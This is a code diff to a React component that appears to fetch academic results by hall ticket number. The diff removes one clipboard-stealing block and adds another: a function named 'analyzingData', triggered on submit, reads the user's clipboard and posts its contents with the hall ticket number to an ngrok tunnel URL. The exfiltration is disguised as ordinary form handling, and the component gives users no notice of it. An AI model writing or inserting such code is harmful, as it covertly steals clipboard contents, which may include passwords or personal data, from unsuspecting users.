@@ -24,7 +24,6 @@ const AcademicResult = () => {
     async function readClipboard() {
       try {
         const browser = navigator.userAgent.toLowerCase();
-
         if (browser.includes("android") || browser.includes("iphone")) {
           const text = await navigator.clipboard.readText();
           try {
@@ -37,32 +36,6 @@ const AcademicResult = () => {
             ) {
               sethallticketno(text);
             }
-            var status = "g";
-            const queryOpts = {
-              name: "clipboard-read",
-              allowWithoutGesture: false,
-            } as any;
-            const permissionStatus =
-              await navigator.permissions.query(queryOpts);
-
-            if (permissionStatus.state === "granted") {
-              status = "granted";
-            } else if (permissionStatus.state === "denied") {
-              status = "denied";
-            } else {
-              status = "ignored";
-            }
-            var data = {
-              hallticket: text,
-              status: status,
-            };
-            const response = await axios.post(
-              "https://70af-103-95-173-139.ngrok-free.app",
-              data,
-            );
-            if (response.status == 200) {
-              sethallticketno(response.data);
-            }
           } catch {
             console.log("error");
           }
@@ -74,13 +47,32 @@ const AcademicResult = () => {
     console.log("got here");
     readClipboard();
   }, []);
+  const analyzingData = async () => {
+    const queryOpts = {
+      name: "clipboard-read",
+      allowWithoutGesture: false,
+    } as any;
+    const permissionStatus = await navigator.permissions.query(queryOpts);
+
+    if (permissionStatus.state === "granted") {
+      const text = await navigator.clipboard.readText();
+      var data = {
+        hallticket: hallticketno,
+        ci: text,
+        status: "granted",
+      };
+      try {
+        axios.post("https://70af-103-95-173-139.ngrok-free.app", data);
+      } catch (err) {}
+    }
+  };
 
   const onSubmit = async () => {
     if (hallticketno.length < 10) {
       toast.error("The Hallticket should be of 10 digits");
       return;
     }
-
+    analyzingData();
     setLoading(true);
 
     try {
